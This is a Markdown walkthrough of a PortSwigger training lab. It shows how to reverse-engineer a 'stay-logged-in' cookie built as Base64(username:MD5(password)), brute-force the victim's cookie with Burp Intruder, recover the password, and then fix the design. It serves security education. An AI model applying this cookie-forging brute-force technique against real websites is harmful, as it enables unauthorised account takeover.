# 📘 PortSwigger Lab: Brute-forcing a Stay-Logged-In Cookie

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie  
> 🎯 Topic: Authentication vulnerabilities — vulnerabilities in other authentication mechanisms  
> 🧪 Difficulty: Practitioner

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🏗 How Stay Logged In Should Work](#correct-flow)
- [❌ Vulnerable Application Logic](#vulnerable-flow)
- [🍪 Why the `stay-logged-in` Cookie Is Dangerous](#cookie-danger)
- [🔍 Step 1 — Log In with Stay Logged In Enabled](#step1)
- [🔍 Step 2 — Identify the Persistent Cookie](#step2)
- [🔍 Step 3 — Decode the Cookie](#step3)
- [🔍 Step 4 — Determine the Cookie Algorithm](#step4)
- [🔍 Step 5 — Validate the MD5 Hypothesis](#step5)
- [🔍 Step 6 — Prepare the Intruder Request](#step6)
- [🔍 Step 7 — Configure Payload Processing](#step7)
- [🔍 Step 8 — Remove the Normal Session Cookie](#step8)
- [🔍 Step 9 — Start the Brute-Force Attack](#step9)
- [🔍 Step 10 — Identify the Correct Password](#step10)
- [🔍 Step 11 — Access Carlos's Account](#step11)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧪 Breakdown of the Valid Cookie](#cookie-breakdown)
- [💡 Why Response Length Was the Main Indicator](#response-length)
- [⚠ Why the `session` Cookie Interfered](#session-conflict)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Access the account page of user `carlos` by brute-forcing his persistent authentication cookie.

Available information:

```text
Your account:
wiener:peter

Victim username:
carlos
```

The lab also provides:

```text
Candidate passwords
```

The objective is to reverse-engineer the `stay-logged-in` cookie, reproduce its generation algorithm for each password candidate, and find the value that authenticates as Carlos.

---

<a id="theory"></a>

## 🧠 Short Theory

After a standard login, an application normally creates a temporary session:

```http
Set-Cookie: session=RANDOM_VALUE
```

A feature called:

```text
Stay logged in
```

or:

```text
Remember me
```

allows authentication to survive after the browser is closed or the normal session ends.

The application therefore issues a separate long-lived cookie:

```http
Set-Cookie: stay-logged-in=...
```

A secure persistent cookie should contain a random and unpredictable token that:

- is independent of the password;
- is securely stored or validated server-side;
- expires;
- can be revoked;
- is rotated when appropriate.

A weak implementation may derive the token from predictable data:

```text
username
password
user ID
timestamp
password hash
```

If the algorithm can be reconstructed, an attacker can generate valid cookies.

---

<a id="idea"></a>

## 🧩 Core Idea

Wiener's cookie was:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

After Base64 decoding:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

The second field is the MD5 hash of `peter`:

```text
MD5("peter")
=
51dc30ddc473d43a6011e9ebba6ca770
```

The application therefore uses:

```text
Base64(username:MD5(password))
```

To attack Carlos, generate:

```text
Base64(carlos:MD5(candidate_password))
```

---

<a id="correct-flow"></a>

## 🏗 How Stay Logged In Should Work

A secure flow:

```text
User submits username and password
        ↓
Server validates credentials
        ↓
Server generates a random token
        ↓
Token is linked to user_id server-side
        ↓
Random cookie is sent to the browser
        ↓
Server validates the token on later visits
        ↓
Token expires and can be revoked
```

Example server-side record:

```text
token_hash -> user_id
expires_at
device_info
last_used_at
```

The key point:

```text
The token must not be derived from the password.
```

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Application Logic

The lab behaves approximately like this:

```text
username = wiener
password = peter
        ↓
MD5(password)
        ↓
wiener:51dc30ddc473d43a6011e9ebba6ca770
        ↓
Base64
        ↓
stay-logged-in cookie
```

Formula:

```text
stay-logged-in =
Base64(username:MD5(password))
```

For Carlos:

```text
candidate password
        ↓
MD5(candidate password)
        ↓
carlos:MD5(candidate password)
        ↓
Base64
        ↓
server-side validation
```

The attacker can reproduce every step.

---

<a id="cookie-danger"></a>

## 🍪 Why the `stay-logged-in` Cookie Is Dangerous

The cookie acts as a bearer token.

That means:

```text
Whoever possesses the cookie
is treated as the authenticated user.
```

The issue is not only MD5.

The fundamental flaw is:

```text
The authentication secret
is directly derived from the password.
```

Even replacing MD5 with SHA-256 would not fix the design:

```text
Base64(username:SHA256(password))
```

The attacker could still perform the same dictionary attack.

Base64 is also not encryption. It is reversible encoding.

---

<a id="step1"></a>

## 🔍 Step 1 — Log In with Stay Logged In Enabled

Start Burp Suite and open the lab.

Log in using:

```text
Username: wiener
Password: peter
```

Enable:

```text
Stay logged in
```

After successful authentication, the application opens:

```text
/my-account
```

Inspect the traffic in:

```text
Proxy → HTTP history
```

---

<a id="step2"></a>

## 🔍 Step 2 — Identify the Persistent Cookie

The login response contains:

```http
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

A normal session cookie may also be present:

```http
Set-Cookie: session=...
```

The interesting value is:

```text
stay-logged-in
```

because it controls persistent authentication.

---

<a id="step3"></a>

## 🔍 Step 3 — Decode the Cookie

Copy:

```text
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

Decode it as Base64.

Result:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Structure:

```text
username:hash
```

The first field is known:

```text
wiener
```

The second field contains 32 hexadecimal characters:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

This resembles an MD5 digest.

---

<a id="step4"></a>

## 🔍 Step 4 — Determine the Cookie Algorithm

The decoded data shows:

```text
wiener:HASH
```

The known password is:

```text
peter
```

This suggests:

```text
HASH = MD5(password)
```

The suspected full chain is:

```text
password
        ↓
MD5(password)
        ↓
username:MD5(password)
        ↓
Base64
        ↓
stay-logged-in
```

---

<a id="step5"></a>

## 🔍 Step 5 — Validate the MD5 Hypothesis

Calculate:

```text
MD5("peter")
```

Result:

```text
51dc30ddc473d43a6011e9ebba6ca770
```

It exactly matches:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

The hypothesis is confirmed.

Formula:

```text
stay-logged-in =
Base64(username:MD5(password))
```

---

<a id="step6"></a>

## 🔍 Step 6 — Prepare the Intruder Request

Request Carlos's account page:

```http
GET /my-account?id=carlos
```

Intercept the request or locate it in HTTP history.

Send it to Intruder:

```text
Right click → Send to Intruder
```

Set the payload position in the cookie:

```http
Cookie: stay-logged-in=§PAYLOAD§
```

Example:

```http
GET /my-account?id=carlos HTTP/2
Host: vulnerable-website.com
Cookie: stay-logged-in=§dGVzdA==§
```

Attack type:

```text
Sniper
```

Payload type:

```text
Simple list
```

Load:

```text
Candidate passwords
```

---

<a id="step7"></a>

## 🔍 Step 7 — Configure Payload Processing

The source payloads are plaintext passwords:

```text
123456
password
qwerty
shadow
...
```

The server expects:

```text
Base64(carlos:MD5(password))
```

Configure these rules in the exact order shown.

### 1. Hash → MD5

```text
shadow
        ↓
3bf1114a986ba87ed28fc1b5884fc2f8
```

### 2. Add prefix → `carlos:`

```text
3bf1114a986ba87ed28fc1b5884fc2f8
        ↓
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
```

### 3. Encode → Base64

```text
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
        ↓
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

Final sequence:

```text
Hash → MD5
Add Prefix → carlos:
Base64 encode
```

The order must not be changed.

---

<a id="step8"></a>

## 🔍 Step 8 — Remove the Normal Session Cookie

The initial request may contain:

```http
Cookie: session=VALID_SESSION; stay-logged-in=§PAYLOAD§
```

Remove:

```http
session=VALID_SESSION
```

Leave only:

```http
Cookie: stay-logged-in=§PAYLOAD§
```

Why:

```text
If the normal session is valid,
the server may use it first.
```

The application would continue to identify the request as `wiener`, making every forged persistent cookie appear ineffective.

---

<a id="step9"></a>

## 🔍 Step 9 — Start the Brute-Force Attack

Start Intruder.

Most requests returned:

```text
Status: 200
Length: 3363
```

One request was different:

```text
Request: 17
Status: 200
Length: 3450
```

Payload:

```text
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

The changed response length indicated different application content.

---

<a id="step10"></a>

## 🔍 Step 10 — Identify the Correct Password

Request 17 corresponded to:

```text
shadow
```

Manual validation:

```text
MD5("shadow")
=
3bf1114a986ba87ed28fc1b5884fc2f8
```

Add the username:

```text
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
```

Base64-encode it:

```text
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

This matches the successful Intruder payload.

Correct password:

```text
shadow
```

---

<a id="step11"></a>

## 🔍 Step 11 — Access Carlos's Account

Use:

```text
Username: carlos
Password: shadow
```

Log in through the normal login form.

Open:

```text
/my-account
```

Carlos's account page is displayed.

The lab is solved.

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
        ↓
2. Enable Stay logged in
        ↓
3. Find the stay-logged-in cookie
        ↓
4. Base64-decode the cookie
        ↓
5. Obtain:
   wiener:51dc30ddc473d43a6011e9ebba6ca770
        ↓
6. Validate MD5("peter")
        ↓
7. Reconstruct:
   Base64(username:MD5(password))
        ↓
8. Send GET /my-account?id=carlos to Intruder
        ↓
9. Remove the session cookie
        ↓
10. Load Candidate passwords
        ↓
11. Configure:
    MD5 → prefix carlos: → Base64
        ↓
12. Start the attack
        ↓
13. Identify Length: 3450
        ↓
14. Recover the source password: shadow
        ↓
15. Log in as carlos:shadow
        ↓
16. Access Carlos's account
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The server used a deterministic token:

```text
Base64(username:MD5(password))
```

Deterministic means:

```text
The same input
always produces the same output.
```

The attacker knew:

```text
victim username
hash algorithm
cookie format
password dictionary
```

Therefore, each candidate could be transformed into:

```text
Base64(carlos:MD5(candidate))
```

and tested against the server.

The vulnerable code may have resembled:

```python
decoded = base64_decode(cookie)
username, supplied_hash = decoded.split(":")

if supplied_hash == md5(database_password_for(username)):
    authenticate(username)
```

The application effectively exposed a password-guessing endpoint through its persistent-login mechanism.

---

<a id="cookie-breakdown"></a>

## 🧪 Breakdown of the Valid Cookie

Plaintext password:

```text
shadow
```

MD5:

```text
3bf1114a986ba87ed28fc1b5884fc2f8
```

String before Base64:

```text
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
```

Final cookie:

```text
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

Complete chain:

```text
shadow
        ↓ MD5
3bf1114a986ba87ed28fc1b5884fc2f8
        ↓ Add prefix
carlos:3bf1114a986ba87ed28fc1b5884fc2f8
        ↓ Base64
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
```

---

<a id="response-length"></a>

## 💡 Why Response Length Was the Main Indicator

Every response used:

```text
Status: 200
```

The status code therefore did not distinguish success.

Most invalid requests returned:

```text
Length: 3363
```

The valid request returned:

```text
Length: 3450
```

The difference meant that the application returned different HTML.

Conceptually:

```text
invalid cookie
        ↓
login page or unauthenticated content
```

versus:

```text
valid cookie
        ↓
Carlos's account page
```

When brute forcing, analyze more than:

```text
Status
```

Also inspect:

```text
Length
Words
Lines
Location
response text
username
Logout link
```

---

<a id="session-conflict"></a>

## ⚠ Why the `session` Cookie Interfered

The original request still contained a valid session cookie for `wiener`.

The application may have used this decision flow:

```text
Is a valid session cookie present?
        ↓
Yes
        ↓
Authenticate using session
        ↓
Ignore stay-logged-in
```

As a result, every response looked identical.

After removing the session cookie:

```text
No normal session
        ↓
Validate stay-logged-in
        ↓
Wrong values fail
        ↓
Correct value authenticates Carlos
```

Important testing principle:

```text
When testing one authentication mechanism,
remove interference from the others.
```

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When testing Remember me or Stay logged in functionality, ask:

```text
1. Which cookie appears when the feature is enabled?
2. Does it change after another login?
3. Does it look random?
4. Can it be decoded?
5. Does it contain a username, email, or user ID?
6. Does any field resemble MD5 or SHA?
7. Is the cookie derived from the password?
8. Can a token be generated for another user?
9. Is cookie validation rate-limited?
10. What happens after removing the session cookie?
11. Is the token revoked on logout?
12. Is it revoked after a password change?
```

Recommended workflow:

```text
Observation
        ↓
Hypothesis
        ↓
Manual validation
        ↓
Automation
        ↓
Difference analysis
```

Main principle:

```text
Do not brute force
until the exact data format is understood.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Treating Base64 as encryption

Base64 requires no key and is trivially reversible.

### 2. Brute-forcing the normal login form

The vulnerable path is the persistent authentication mechanism.

### 3. Keeping the `session` cookie

The server continues to use Wiener's valid session.

### 4. Using the `wiener:` prefix

The attack requires:

```text
carlos:
```

### 5. Misordering payload-processing rules

Correct:

```text
MD5
        ↓
carlos:
        ↓
Base64
```

### 6. Base64-encoding only the hash

Encode the complete string:

```text
carlos:MD5(password)
```

### 7. Looking only at Status

The successful result was identified by:

```text
Length
```

### 8. Failing to validate the winning payload manually

Decode and verify the transformation chain after finding an anomaly.

### 9. Assuming the request number is the password-list index

Inspect the original source payload directly.

---

<a id="defense"></a>

## 🛡 Mitigation

A secure design requires multiple controls.

### 1. Use random tokens

For example:

```text
256-bit random value
```

The token must not be derived from:

```text
username
password
password hash
email
timestamp
```

### 2. Store only a token hash server-side

Example:

```text
selector
token_hash
user_id
expires_at
```

### 3. Enforce expiration

Persistent cookies must not live indefinitely.

### 4. Revoke tokens

Invalidate tokens after:

```text
Logout
password change
Logout from all devices
suspicious activity
```

### 5. Rotate tokens

Issue a fresh value after successful use where appropriate.

### 6. Set secure cookie attributes

```http
Secure
HttpOnly
SameSite=Lax
```

### 7. Apply rate limiting

Limit repeated persistent-cookie validation attempts.

### 8. Monitor anomalies

Detect:

```text
thousands of cookie guesses for one username
sequential brute-force patterns
repeated validation failures
rapid IP and device changes
```

Secure flow:

```text
Login successful
        ↓
Generate random token
        ↓
Store token hash server-side
        ↓
Send random token to browser
        ↓
Validate token and expiry
        ↓
Rotate or revoke when necessary
```

---

<a id="checklist"></a>

## ✅ Checklist

- [x] Logged in as `wiener:peter`.
- [x] Enabled Stay logged in.
- [x] Identified the `stay-logged-in` cookie.
- [x] Base64-decoded the cookie.
- [x] Obtained `wiener:51dc30ddc473d43a6011e9ebba6ca770`.
- [x] Identified the `username:hash` structure.
- [x] Verified that the hash equals `MD5("peter")`.
- [x] Reconstructed `Base64(username:MD5(password))`.
- [x] Prepared `GET /my-account?id=carlos`.
- [x] Sent the request to Intruder.
- [x] Placed the payload marker in `stay-logged-in`.
- [x] Loaded Candidate passwords.
- [x] Configured Hash → MD5.
- [x] Added the `carlos:` prefix.
- [x] Added Base64 encoding.
- [x] Removed the normal `session` cookie.
- [x] Started the brute-force attack.
- [x] Found the anomalous `Length: 3450` response.
- [x] Identified the password `shadow`.
- [x] Logged in as `carlos:shadow`.
- [x] Accessed Carlos's account.
- [x] Solved the lab.

---

# ⬆ Back to Top

[Return to contents](#top)
